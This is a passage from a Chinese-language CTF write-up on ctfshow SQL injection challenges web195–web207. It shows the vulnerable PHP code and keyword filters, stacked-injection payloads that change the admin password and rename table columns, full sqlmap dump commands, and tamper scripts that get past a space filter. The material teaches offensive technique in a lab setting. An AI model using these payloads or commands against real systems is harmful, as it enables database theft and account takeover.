</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select pass from ctfshow_user where username = </span><span class="si">{</span><span class="nv">$username</span><span class="si">}</span><span class="s2">;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">      
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="c1">//密码检测
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$password</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;密码只能为数字&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$ret</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">  <span class="c1">//密码判断
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">]</span><span class="o">==</span><span class="nv">$password</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">      <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;登陆成功&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl">  <span class="c1">//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
</span></span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&#39;|\&#34;|select|union|or|and|\x26|\x7c|file|into/i&#39;</span><span class="p">,</span> <span class="nv">$username</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;用户名非法&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$ret</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">
</span></span><span class="line"><span class="ln">25</span><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">==</span><span class="nv">$password</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">      <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s2">&#34;登陆成功 flag is </span><span class="si">$flag</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">  <span class="p">}</span>
</span></span></code></pre></div><p>根据提示堆叠注入</p>
<p>其实就是在;后面再执行任意的sql命令</p>
<p>这里直接改密码</p>
<pre tabindex="0"><code>payload=&#34;0x61646d696e;update`ctfshow_user`set`pass`=0x313131;&#34;
# 至于为什么非得用十六进制登录，是因为下面这个没有字符串单引号包围
sql = &#34;select pass from ctfshow_user where username = {$username};&#34;;
# @Author:Y4tacker
</code></pre><pre tabindex="0"><code>admin &lt;=&gt; 0x61646d696e
111&lt;=&gt;0x313131
</code></pre><p><img alt="image-20250210000521664" loading="lazy" src="./assets/image-20250210000521664.png"></p>
<h4 id="web196">web196<a hidden class="anchor" aria-hidden="true" href="#web196">#</a></h4>
<pre tabindex="0"><code>查询语句

  //拼接sql语句查找指定ID用户
  $sql = &#34;select pass from ctfshow_user where username = {$username};&#34;;
      
返回逻辑


  //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
  if(preg_match(&#39;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&#39;|\&#34;|select|union|or|and|\x26|\x7c|file|into/i&#39;, $username)){
    $ret[&#39;msg&#39;]=&#39;用户名非法&#39;;
    die(json_encode($ret));
  }

  if(strlen($username)&gt;16){
    $ret[&#39;msg&#39;]=&#39;用户名不能超过16个字符&#39;;
    die(json_encode($ret));
  }

  if($row[0]==$password){
      $ret[&#39;msg&#39;]=&#34;登陆成功 flag is $flag&#34;;
  }
      
</code></pre><p>这题应该是bug了，select没被waf</p>
<p><img alt="在这里插入图片描述" loading="lazy" src="./assets/1e88bb7a716790c989f552fb4a0e1a2a.png"></p>
<p>在 PHP 里，当使用数据库查询语句从数据库中获取结果集时，通常会逐行遍历结果集。每一行数据可以用一个数组来表示，<code>$row[0]</code> 指的是这一行数组中的第一个元素。</p>
<p>payload:</p>
<pre tabindex="0"><code>0;select(2)
2
</code></pre><h4 id="web197">web197<a hidden class="anchor" aria-hidden="true" href="#web197">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">查询语句</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="c1">//拼接sql语句查找指定ID用户
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select pass from ctfshow_user where username = </span><span class="si">{</span><span class="nv">$username</span><span class="si">}</span><span class="s2">;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">      
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">  <span class="c1">//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="s1">&#39;/\*|\#|\-|\x23|\&#39;|\&#34;|union|or|and|\x26|\x7c|file|into|select|update|set//i&#39;</span><span class="p">,</span> <span class="nv">$username</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;用户名非法&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$ret</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">==</span><span class="nv">$password</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">      <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s2">&#34;登陆成功 flag is </span><span class="si">$flag</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">      
</span></span></code></pre></div><p>这把不能用select，那我们只需要想办法给$row[0]一个确定的值即可</p>
<p>比如</p>
<pre tabindex="0"><code>username: 1;show tables 
password: ctfshow_user
</code></pre><p>其他的一些骚操作</p>
<p>重写ctfshow_user表</p>
<p><img alt="image-20250210001411101" loading="lazy" src="./assets/image-20250210001411101.png"></p>
<p>把密码和id列互换之后爆密码（实际上在爆id）</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="c1"># @Author:Y4tacker</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://b126bc7c-2b32-461d-9520-30d5baf7a152.chall.ctf.show/api/&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">            <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="s1">&#39;0;alter table ctfshow_user change column `pass` `ppp` varchar(255);alter table ctfshow_user &#39;</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">                        <span class="s1">&#39;change column `id` `pass` varchar(255);alter table ctfshow_user change column `ppp` `id` &#39;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">                        <span class="s1">&#39;varchar(255);&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">            <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="s1">&#39;0x61646d696e&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">if</span> <span class="s2">&#34;登陆成功&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;msg&#39;</span><span class="p">]:</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;msg&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="k">break</span>
</span></span></code></pre></div><h4 id="web198">web198<a hidden class="anchor" aria-hidden="true" href="#web198">#</a></h4>
<p>同web197</p>
<h4 id="web199">web199<a hidden class="anchor" aria-hidden="true" href="#web199">#</a></h4>
<p>通解一把梭</p>
<h4 id="web200">web200<a hidden class="anchor" aria-hidden="true" href="#web200">#</a></h4>
<p>通解一把梭</p>
<h4 id="web190-web200通解">web190-web200通解<a hidden class="anchor" aria-hidden="true" href="#web190-web200通解">#</a></h4>
<pre tabindex="0"><code>username=0;show tables;
pass=ctfshow_user
</code></pre><h4 id="sqlmap的使用">sqlmap的使用<a hidden class="anchor" aria-hidden="true" href="#sqlmap的使用">#</a></h4>
<h4 id="web201">web201<a hidden class="anchor" aria-hidden="true" href="#web201">#</a></h4>
<pre tabindex="0"><code> sqlmap最新版下载
 使用--user-agent 指定agent
 使用--referer 绕过referer检查
</code></pre><pre tabindex="0"><code>检测注入类型
python sqlmap.py -u http://6583b09f-115c-4262-8c47-df0a033b1926.challenge.ctf.show/sqlmap.php/api/?id= --user-agent sqlmap --referer ctf.show

爆数据库
python sqlmap.py -u http://6583b09f-115c-4262-8c47-df0a033b1926.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show --dbs

爆表
python sqlmap.py -u http://6583b09f-115c-4262-8c47-df0a033b1926.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show -D 
ctfshow_web --tables 

爆列
python sqlmap.py -u http://6583b09f-115c-4262-8c47-df0a033b1926.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show -D 
ctfshow_web -T ctfshow_user --columns

爆值
python sqlmap.py -u http://6583b09f-115c-4262-8c47-df0a033b1926.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show -D ctfshow_web -T ctfshow_user --dump 
</code></pre><h4 id="web202">web202<a hidden class="anchor" aria-hidden="true" href="#web202">#</a></h4>
<pre tabindex="0"><code> sqlmap最新版下载

 使用--data 调整sqlmap的请求方式
</code></pre><pre tabindex="0"><code>//拼接sql语句查找指定ID用户
$sql = &#34;select id,username,password from ctfshow_user where username !=&#39;flag&#39; and id = &#39;&#34;.$_GET[&#39;id&#39;].&#34;&#39;;&#34;;
      
返回逻辑

//对传入的参数进行了过滤
  function waf($str){
   //代码过于简单，不宜展示
  }
</code></pre><p>通过向命令行加入&ndash;data参数转化请求方式为post</p>
<pre tabindex="0"><code>sqlmap -u http://e39cef84-16aa-4167-b5d8-2609318ff7cc.challenge.ctf.show/api/ --data &#39;id=1&#39; --user-agent sqlmap --referer ctf.show -D ctfshow_web -T ctfshow_user --dump 
</code></pre><h4 id="web203">web203<a hidden class="anchor" aria-hidden="true" href="#web203">#</a></h4>
<pre tabindex="0"><code> sqlmap最新版下载
 使用--method 调整sqlmap的请求方式
</code></pre><pre tabindex="0"><code>查询语句

//拼接sql语句查找指定ID用户
$sql = &#34;select id,username,password from ctfshow_user where username !=&#39;flag&#39; and id = &#39;&#34;.$_GET[&#39;id&#39;].&#34;&#39;;&#34;;
      
返回逻辑

//对传入的参数进行了过滤
  function waf($str){
   //代码过于简单，不宜展示
  }
</code></pre><p>&ndash;headers=&ldquo;Content-Type: text/plain&rdquo; 以表单形式发送</p>
<pre tabindex="0"><code>sqlmap -u &#34;http://29e626b4-75fb-4058-98af-126d2bf725c5.challenge.ctf.show/api/index.php&#34; --method=&#34;PUT&#34; --data=&#34;id=1&#34; --referer=ctf.show --headers=&#34;Content-Type: text/plain&#34; -D ctfshow_web -T ctfshow_user -C pass --dump 
</code></pre><h4 id="web204">web204<a hidden class="anchor" aria-hidden="true" href="#web204">#</a></h4>
<pre tabindex="0"><code>使用--cookie 提交cookie数据
</code></pre><p>payload:</p>
<pre tabindex="0"><code> sqlmap -u &#34;http://c07422b1-5bde-4baa-9e8c-73ef4edfa83a.challenge.ctf.show/api/index.php&#34; --method=&#34;PUT&#34; --data=&#34;id=1&#34; --referer=ctf.show --headers=&#34;Content-Type: text/plain&#34; --cookie=&#34;PHPSESSID:eqf4q2s5ma4u4vtj31sf25lbp5;ctfshow:d5d0917
6f63d87074e926a342a996872&#34; -D ctfshow_web -T ctfshow_user -C pass --dump
</code></pre><h4 id="web205">web205<a hidden class="anchor" aria-hidden="true" href="#web205">#</a></h4>
<pre tabindex="0"><code>api调用需要鉴权
</code></pre><p>通过抓包分析，在每次请求<code>url/api/index.php</code>之前需要先请求<code>URL/api/getTokn.php</code></p>
<p><img alt="image-20250213112654599" loading="lazy" src="./assets/image-20250213112654599.png"></p>
<p>payload：</p>
<pre tabindex="0"><code>sqlmap -u &#34;http://24e98b18-4f9a-4a11-a265-5022e0e3fb05.challenge.ctf.show/api/index.php&#34; --method=&#34;PUT&#34; --data=&#34;id=1&#34; --referer=ctf.show --headers=&#34;Content-Type: text/plain&#34; --cookie=&#34;PHPSESSID=60prkqe8189934t5pv3ikepa16&#34; --safe-url=&#34;http://24e98b18-4f9a-4a11-a265-5022e0e3fb05.challenge.ctf.show/api/getToken.php&#34; --safe-freq=1 -D ctfshow_web -T ctfshow_flax --dump
</code></pre><h4 id="web206">web206<a hidden class="anchor" aria-hidden="true" href="#web206">#</a></h4>
<pre tabindex="0"><code> sql需要闭合
</code></pre><pre tabindex="0"><code>//拼接sql语句查找指定ID用户
$sql = &#34;select id,username,pass from ctfshow_user where id = (&#39;&#34;.$id.&#34;&#39;) limit 0,1;&#34;;
      
</code></pre><p>sqlmap会自动构造闭合，所以跟前一题没什么区别</p>
<p>但是也可以手动构造一下</p>
<p>payload:</p>
<pre tabindex="0"><code>根据sql语句，我们采用“)#”的方式进行右闭合。----suffix=&#34;)#&#34;
执行sqlmap命令行
sqlmap -u &#34;http://aae90b40-e094-482a-bbe1-eabb586a4291.challenge.ctf.show/api/index.php&#34; --data &#34;id=1&#34; --user-agent=sqlmap --referer=ctf.show --method=put --headers=&#34;Content-Type:text/plain&#34; --cookie=&#34;PHPSESSID=sie3k7c33euvbk2s2753f6n0j0;&#34; --safe-url=&#34;https://aae90b40-e094-482a-bbe1-eabb586a4291.challenge.ctf.show/api/getToken.php&#34; --safe-freq=1 --suffix=&#34;)#&#34; --dbs

sqlmap -u &#34;http://00b4cc54-fdc1-4b6a-ada7-bc509824917a.challenge.ctf.show/api/index.php&#34; --data &#34;id=1&#34; --user-agent=sqlmap --referer=ctf.show --method=put --headers=&#34;Content-Type:text/plain&#34; --cookie=&#34;PHPSESSID=lb4lslploh7thdl0hdsd1008f9;&#34; --safe-url=&#34;https://00b4cc54-fdc1-4b6a-ada7-bc509824917a.challenge.ctf.show/api/getToken.php&#34; --safe-freq=1 --suffix=&#34;)#&#34; -D ctfshow_web --tables

sqlmap -u http://52acc440-2ed1-4b93-b3af-171d78632ae7.challenge.ctf.show/api/index.php --method=PUT --data=&#34;id=1&#34; --referer=ctf.show --dbms=mysql -D &#34;ctfshow_web&#34; -T &#34;ctfshow_flaxc&#34; -C &#34;flagv&#34; --dump  --headers=&#34;Content-Type: text/plain&#34; --safe-url=http://52acc440-2ed1-4b93-b3af-171d78632ae7.challenge.ctf.show/api/getToken.php --safe-freq=1 
</code></pre><h4 id="web207">web207<a hidden class="anchor" aria-hidden="true" href="#web207">#</a></h4>
<p><a href="https://y4er.com/post/sqlmap-tamper/">Sqlmap Tamper 编写</a></p>
<p>示例</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="ch">#!/usr/bin/env python</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="s2">Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="s2">See the file &#39;doc/COPYING&#39; for copying permission
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="kn">from</span> <span class="nn">lib.core.enums</span> <span class="kn">import</span> <span class="n">PRIORITY</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="n">__priority__</span> <span class="o">=</span> <span class="n">PRIORITY</span><span class="o">.</span><span class="n">LOW</span> <span class="c1"># 当前脚本调用优先等级</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="k">def</span> <span class="nf">dependencies</span><span class="p">():</span> <span class="c1"># 声明当前脚本适用/不适用的范围，可以为空。</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="k">pass</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span> <span class="c1"># 用于篡改Payload、以及请求头的主要函数</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="k">return</span> <span class="n">payload</span>
</span></span></code></pre></div><p>题目</p>
<pre tabindex="0"><code>查询语句

//拼接sql语句查找指定ID用户
$sql = &#34;select id,username,pass from ctfshow_user where id = (&#39;&#34;.$id.&#34;&#39;) limit 0,1;&#34;;
      
返回逻辑

//对传入的参数进行了过滤
  function waf($str){
   return preg_match(&#39;/ /&#39;, $str);
  }
</code></pre><p>这里会将waf中的关键词替换成空格</p>
<p>放一个Y4tacker大佬的脚本</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="ch">#!/usr/bin/env python</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="s2">Author:Y4tacker
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="c1"># 假设在Python 3环境中运行，将xrange替换为range</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="c1"># 从lib.core.enums模块中导入PRIORITY枚举类型</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="kn">from</span> <span class="nn">lib.core.enums</span> <span class="kn">import</span> <span class="n">PRIORITY</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="c1"># 设置脚本的优先级为低</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="n">__priority__</span> <span class="o">=</span> <span class="n">PRIORITY</span><span class="o">.</span><span class="n">LOW</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="s2">    篡改函数，调用space2comment函数对有效负载进行处理
</span></span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="s2">    :param payload: 待处理的有效负载
</span></span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="s2">    :param kwargs: 其他关键字参数
</span></span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="s2">    :return: 处理后的有效负载
</span></span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">space2comment</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">return</span> <span class="n">payload</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="k">def</span> <span class="nf">space2comment</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="s2">    将有效负载中的空格字符替换为换行符
</span></span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="s2">    :param payload: 待处理的有效负载
</span></span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="s2">    :return: 处理后的有效负载
</span></span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="n">retVal</span> <span class="o">=</span> <span class="n">payload</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">    <span class="k">if</span> <span class="n">payload</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="n">retVal</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">        <span class="c1"># 用于跟踪是否在单引号内</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">        <span class="n">quote</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">        <span class="c1"># 用于跟踪是否在双引号内</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">        <span class="n">doublequote</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">        <span class="c1"># 用于跟踪是否遇到第一个空格</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">        <span class="n">firstspace</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">
</span></span><span class="line"><span class="ln">39</span><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)):</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="n">firstspace</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">                <span class="k">if</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">isspace</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">                    <span class="n">firstspace</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">                    <span class="n">retVal</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="mh">0x0a</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">                    <span class="k">continue</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl">
</span></span><span class="line"><span class="ln">46</span><span class="cl">            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;</span><span class="se">\&#39;</span><span class="s1">&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl">                <span class="c1"># 取反quote的值</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl">                <span class="n">quote</span> <span class="o">=</span> <span class="ow">not</span> <span class="n">quote</span>
</span></span><span class="line"><span class="ln">49</span><span class="cl">
</span></span><span class="line"><span class="ln">50</span><span class="cl">            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">51</span><span class="cl">                <span class="c1"># 取反doublequote的值</span>
</span></span><span class="line"><span class="ln">52</span><span class="cl">                <span class="n">doublequote</span> <span class="o">=</span> <span class="ow">not</span> <span class="n">doublequote</span>
</span></span><span class="line"><span class="ln">53</span><span class="cl">
</span></span><span class="line"><span class="ln">54</span><span class="cl">            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34; &#34;</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">doublequote</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">quote</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">55</span><span class="cl">                <span class="n">retVal</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="mh">0x0a</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">56</span><span class="cl">                <span class="k">continue</span>
</span></span><span class="line"><span class="ln">57</span><span class="cl">
</span></span><span class="line"><span class="ln">58</span><span class="cl">            <span class="n">retVal</span> <span class="o">+=</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">59</span><span class="cl">
</span></span><span class="line"><span class="ln">60</span><span class="cl">    <span class="k">return</span> <span class="n">retVal</span>
</span></span></code></pre></div><p>其实这段代码的目的就是将payload中的空格替换成换行符</p>
<p>其实直接用sqlmap自带的sapce2comment模板</p>
